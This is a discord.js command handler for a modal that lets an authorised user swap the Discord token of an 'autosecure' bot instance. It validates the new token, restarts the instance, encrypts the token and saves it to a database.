const { EmbedBuilder } = require("discord.js");
const showbotmsg = require("../../utils/bot/showbotmsg");
const { queryParams } = require("../../../db/database");
const { autosecureMap } = require("../../../mainbot/handlers/botHandler");
const autosecure = require("../../autosecure");
const checkToken = require("../../utils/utils/checkToken");
const isOwner = require("../../../db/isOwner");
const { encryptToken } = require("../../utils/security/tokenCipher");

module.exports = {
    name: "tokenmodal",
    editbot: true,
    callback: async (client, interaction) => {
        const token = interaction.fields.getTextInputValue('token');
        if (client.isuserbot) {
            await interaction.reply({
                embeds: [
                    new EmbedBuilder()
                        .setTitle("Please use the main VinGr0ups3cur3 bot to swap tokens for this bot!")
                        .setColor("#87CEEB")
                ],
                ephemeral: true
            });
            return;
        }

        await interaction.deferUpdate();

        const [userId, botnumber] = interaction.customId.split('|').slice(1);
        const isAuthorized = interaction.user.id === userId || await isOwner(interaction.user.id);
        if (!isAuthorized) {
            return interaction.followUp({
                content: `You are not authorized to update this bot's token.`,
                ephemeral: true
            });
        }

        const checked = await checkToken(token);
        if (!checked) {
            return interaction.followUp({
                content: `Please fill in a valid Discord Token!`,
                ephemeral: true
            });
        }

        const key = `${userId}|${botnumber}`;
        const existing = autosecureMap.get(key);

        if (existing) {
            autosecureMap.delete(key);
            try { existing.destroy(); } catch (e) {}
        }

        const instance = await autosecure(token, userId, botnumber);
        autosecureMap.set(key, instance);

        const encryptedToken = encryptToken(token);
        await queryParams(
            'UPDATE autosecure SET token = ? WHERE user_id = ? AND botnumber = ?',
            [encryptedToken, userId, botnumber]
        );

        const msg = await showbotmsg(interaction.user.id, botnumber, interaction.user.id, client);
        return interaction.editReply(msg);
    }
};
